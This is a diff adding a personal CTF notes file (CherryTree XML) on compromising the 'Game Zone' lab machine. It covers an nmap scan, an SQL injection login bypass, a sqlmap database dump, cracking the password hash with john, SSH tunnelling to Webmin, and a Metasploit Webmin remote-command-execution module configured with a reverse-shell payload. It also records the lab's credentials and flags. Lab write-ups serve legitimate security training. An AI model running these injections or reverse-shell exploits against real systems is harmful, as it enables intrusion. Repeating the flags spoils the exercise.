@@ -1,0 +1,176 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Game Zone" unique_id="20" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692886527" ts_lastsave="1692890851">
+    <rich_text>nmap -sC -sV -vv -Pn -n 10.10.36.134
+22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 61ea89f1d4a7dca550f76d89c3af0b03 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFJTi0lKi0G+v4eFQU+P+CBodBOruOQC+3C/nXv0JVeR7yDWH6iRsFsevDofWcq05MZBr/CDPCnluhZzM1psx+5bp1Eiv3ecO0PF1QjhAzsPwUcmFSG1zAg+S757M+RFeRs0Jw0WMev8N6aR3uBZQSDPwBHGps+mZZZRcsssckJGQCZ4Qg/6PVFIwNGx9UoftdMFyfNMU/TDZmoatzo/FNEJOhbR38dF/xw9s/HRhugrUsLdNHyBxYShcY3B0Y2eLjnnuUWhYPmLZqgHuHr+eKnb1Ae3MB5lJTfZf3OmWaqcDVI3wpvQK7ACC9S8nxL3vYLyzxlvucEZHM9ILBI7Ov
+|   256 536709dcfffb3a3efbfecfd86d4127ab (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL6LScmHgHeP2OMerYFiDsNPqgqFbsL+GsyehB76kldy
+
+
+ssh agent47@10.10.36.134	-&gt;		videogamer124
+user.txt 	-&gt; 	649ac17b1480ac13ef1e4fa579dac95c
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text justification="center" scale="h3">
+</rich_text>
+    <rich_text>
+Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.
+-L is a local tunnel (YOU &lt;-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.
+-R is a remote tunnel (YOU --&gt; CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.
+
+We will use a tool called ss to investigate sockets running on a host.
+If we run ss -tulpn it will tell us what socket connections are running
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+
+ss -tulpn 
+agent47@gamezone:~$ ss -tulpn
+Netid State      Recv-Q Send-Q                                                                 Local Address:Port                                                                                Peer Address:Port              
+udp   UNCONN     0      0                                                                                  *:68                                                                                             *:*                  
+udp   UNCONN     0      0                                                                                  *:10000                                                                                          *:*                  
+</rich_text>
+    <rich_text background="#a5a51d1d2d2d">tcp   LISTEN     0      80                                                                         127.0.0.1:3306                                                                                           *:*                  
+tcp   LISTEN     0      128                                                                                *:10000                                                                                          *:*                  
+tcp   LISTEN     0      128                                                                                *:22                                                                                             *:*                  
+tcp   LISTEN     0      128                                                                               :::80                                                                                            :::*                  
+tcp   LISTEN     0      128                                                                               :::22                                                                                            :::*                  </rich_text>
+    <rich_text>
+
+They are literally listeners which can be viewed through linpeas.sh too
+ssh -L 10000:localhost:10000 agent47@10.10.36.134
+	
+</rich_text>
+    <rich_text link="webs http://localhost:10000/">http://localhost:10000/</rich_text>
+    <rich_text>	-&gt; username:agent47	password:videogamer124
+Webmin -&gt; 1.580
+System hostname 	gamezone (127.0.1.1)
+Operating system 	Ubuntu Linux 16.04.6
+Webmin version 	1.580
+Time on system 	Thu Aug 24 10:17:12 2023
+Kernel and CPU 	Linux 4.4.0-159-generic on x86_64
+Processor information 	Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz, 1 cores
+System uptime 	1 hours, 00 minutes
+Running processes 	127
+CPU load averages 	0.00 (1 min) 0.01 (5 mins) 0.00 (15 mins)
+CPU usage 	0% user, 0% kernel, 0% IO, 100% idle
+Real memory 	1.95 GB total, 477.50 MB used	
+Virtual memory 	975 MB total, 0 bytes used	
+Local disk space 	8.78 GB total, 2.82 GB used	
+Package updates 	All installed packages are up to date
+
+</rich_text>
+    <rich_text link="webs https://www.exploit-db.com/exploits/21851">https://www.exploit-db.com/exploits/21851</rich_text>
+    <rich_text>		-&gt;		CVE-2012-2092
+Metasploit
+0  exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
+Module options (exploit/unix/webapp/webmin_show_cgi_exec):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD  videogamer124    yes       Webmin Password
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS    127.0.0.1        yes       The target host(s), see </rich_text>
+    <rich_text link="webs https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html">https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</rich_text>
+    <rich_text>
+   RPORT     10000            yes       The target port (TCP)
+   SSL       false            yes       Use SSL
+   USERNAME  agent47          yes       Webmin Username
+   VHOST                      no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.18.85.195     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Webmin 1.580
+
+root.txt -&gt; a4b945830144bdd71908d12d902adeee
+
+
+
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Game Zone
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+</rich_text>
+    <rich_text link="webs http://10.10.36.134/">http://10.10.36.134/</rich_text>
+    <rich_text> 
+username -&gt; ' or 1=1 -- 
+password -&gt; blank
+</rich_text>
+    <rich_text link="webs http://10.10.36.134/portal.php">http://10.10.36.134/portal.php</rich_text>
+    <rich_text>
+sqlmap -r req.txt --dump --batch
+
+Database: db
+Table: users
+[1 entry]
++------------------------------------------------------------------+----------+
+| pwd                                                              | username |
++------------------------------------------------------------------+----------+
+| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
++------------------------------------------------------------------+----------+
+
+john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt --format=RAW-SHA256
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA256 [SHA256 512/512 AVX512BW 16x])
+Warning: poor OpenMP scalability for this hash type, consider --fork=2
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+videogamer124    (?)     
+1g 0:00:00:00 DONE (2023-08-24 20:37) 8.333g/s 24576Kp/s 24576Kc/s 24576KC/s vimivi..vainlove
+Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
+
+
+
+</rich_text>
+    <encoded_png char_offset="801" justification="left" link="webs https://i.imgur.com/cYZsC8p.png" sha256sum="fe966ddfeed54cc909230ac028a6c4ded218cff850a53337e9a5cee9fe82f4e9"/>
+    <table char_offset="1558" justification="left" col_min="60" col_max="60" col_widths="0,0">
+      <row>
+        <cell>-t</cell>
+        <cell>Display TCP sockets</cell>
+      </row>
+      <row>
+        <cell>-u</cell>
+        <cell>Display UDP sockets</cell>
+      </row>
+      <row>
+        <cell>-l</cell>
+        <cell>Displays only listening sockets</cell>
+      </row>
+      <row>
+        <cell>-p</cell>
+        <cell>Shows the process using the socket</cell>
+      </row>
+      <row>
+        <cell>-n</cell>
+        <cell>Doesn't resolve service names</cell>
+      </row>
+      <row>
+        <cell>Argument</cell>
+        <cell>Description</cell>
+      </row>
+    </table>
+  </node>
+</cherrytree>
